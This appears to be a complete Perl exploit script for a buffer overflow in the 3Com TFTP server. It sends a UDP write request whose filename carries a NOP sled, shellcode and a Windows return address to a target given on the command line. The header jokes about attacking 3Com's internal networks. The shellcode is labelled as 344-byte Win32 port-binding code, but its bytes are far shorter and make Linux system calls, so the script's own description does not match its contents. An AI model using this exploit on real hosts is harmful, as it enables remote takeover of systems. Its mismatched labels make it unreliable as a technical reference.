#!/usr/bin/perl
# 3com_tftp_bof.pl
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# Easily owns ancient 3CTftpSvc.zip
# <JOKE!@#$% OK!@#$% JOKE!@#$%>
# Now how about a time machine and axx to 3com internal networks!
# </JOKE!@#$% OK!@#$% JOKE!@#$%>

use IO::Socket;

$win2ksp4  = 0x77E43292; # user32.dll JMP ESI
$winxpsp3  = 0x7E485184; # user32.dll JMP ESI
$test1234  = 0x41424344; # Debugging Purposes

	     # Win32 Portbind Shellcode (pexfnstsub/metasploit,size=344,port=4444)
$shellcode = "\x31\xc9\xf7\xe1\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\x43\xb0\x66\xcd\x80\x89\xc7\x52\x68\x22\x04\x2c\x04\x66\x68\x27\x0f\xb2\x02\x66\x52\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xdb\x31\xc9\x51\x66\x68\x63\x62\x89\xe3\x66\xb9\x42\x02\x66\xba\xc0\x01\xb0\x05\xcd\x80\x89\xc6\x31\xc9\xf7\xe1\x99\x66\xba\xe8\x03\x31\xdb\x31\xc0\xb0\x03\x89\xfb\x8d\x8c\x24\x18\xfc\xff\xff\xcd\x80\x89\xf3\x89\xc2\x31\xc0\xb0\x04\xcd\x80\x66\x81\xfa\xe8\x03\x74\xde\x89\xf3\x31\xc0\xb0\x06\xcd\x80\x31\xc9\xf7\xe1\x51\x66\x68\x63\x62\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80";

$target    = $ARGV[0];
$os        = $ARGV[1];

if(!defined($target) || !defined($os))
{

     print "Usage: $0 <1.2.3.4> [1=win2ksp4/2=winxpsp3/3=test1234]\n";

}

if($os == "1") { $retaddr = pack('l', $win2ksp4); }
if($os == "2") { $retaddr = pack('l', $winxpsp3); }
if($os == "3") { $retaddr = pack('l', $test1234); }

# [packet]   write      filename  start mode    start our payload (transport mode name)
$payload = "\x00\x02" . "roffles" . "\x00" . "\x90" x 129 . $shellcode . $retaddr . "\x00"; # 129 + 344 + 4 = 477

$sock = IO::Socket::INET->new(Proto=>'udp', PeerAddr=>$target, PeerPort=>'69') or die "Error: $target/69\n";

     print $sock $payload;
     close($sock);

exit;